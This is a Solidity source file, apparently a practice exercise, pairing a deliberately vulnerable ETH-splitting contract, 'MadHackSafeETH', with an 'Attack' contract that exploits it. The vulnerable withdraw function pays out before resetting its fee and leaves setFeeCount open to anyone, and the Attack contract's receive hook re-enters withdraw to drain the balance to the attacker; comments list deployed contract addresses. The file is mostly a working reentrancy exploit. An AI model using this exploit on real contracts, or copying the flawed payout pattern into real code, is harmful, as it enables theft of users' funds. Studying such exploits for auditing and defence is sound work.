// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.16;

contract MadHackSafeETH {
    uint256 public feeCount = 1 ether;

    mapping(address => uint256) public balances;

    constructor(address[] memory _payees) {
        payees = _payees;
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function setFeeCount(uint256 fee) public {
        feeCount = fee;
    }
    // Helper function to check the balance of this contract

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function safeTransferETH(address to, uint256 amount) internal {
        bool success;

        assembly {
            // Transfer the ETH and store if it succeeded or not.
            success := call(gas(), to, amount, 0, 0, 0, 0)
        }

        require(success, "ETH_TRANSFER_FAILED");
    }

    uint256 public passThrough;

    address[] public payees;

    function withdraw(address recipient) external {
        // uint256 len = splitter.payeesLength(); // public callable
        uint256 len = payees.length;
        address[] memory addrs = new address[](len);
        uint256[] memory values = new uint256[](len);
        uint256 _val;
        if (feeCount > 0 && recipient != address(0)) {
            _val = address(this).balance - feeCount;
            safeTransferETH(payable(recipient), feeCount); // re-nter here
            feeCount = 0;
        } else {
            _val = address(this).balance;
        }

        // Log entries.
        passThrough++;

        uint256 i;
        for (i; i < len;) {
            // address addr = splitter._payees(i); // public callable
            // uint256 share = splitter._shares(addr);
            address addr = payees[i];
            uint256 share = 5;
            addrs[i] = addr;
            values[i] = ((_val * (share * 1e2)) / 10_000);
            unchecked {
                ++i;
            }
        }
        uint256 j;
        while (j < len) {
            safeTransferETH(addrs[j], values[j]); // re-enter here.
            unchecked {
                ++j;
            }
        }
    }
}

contract Attack {
    MadHackSafeETH public madHackSafeETH;
    address hackerOwner;

    uint256 public startBalance;

    constructor(address _madHackSafeETHAddress, address _hackerOwner) {
        madHackSafeETH = MadHackSafeETH(_madHackSafeETHAddress);
        hackerOwner = _hackerOwner;
    }

    receive() external payable {
        if (address(madHackSafeETH).balance >= (startBalance - (startBalance / 2))) {
            madHackSafeETH.withdraw(address(this));
        }
        // madHackSafeETH.getBalance();
        // selfdestruct(payable(hackerOwner));
    }

    function attack(uint256 _startBalance) external payable {
        startBalance = _startBalance;

        madHackSafeETH.withdraw(address(this));
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

// fee count: 1000000000000000000
// 0x37f8A67378CB690dd00bD98cAf4336cE0f7c3711

// MadHackSafeETH
// 0x07e740fe9d0bcBC18dC8aa9FEb95cEC41EA5aacc

// Attack
// 0xCC7F742f63F434c7f872dAE5Bebd43B7758B871a
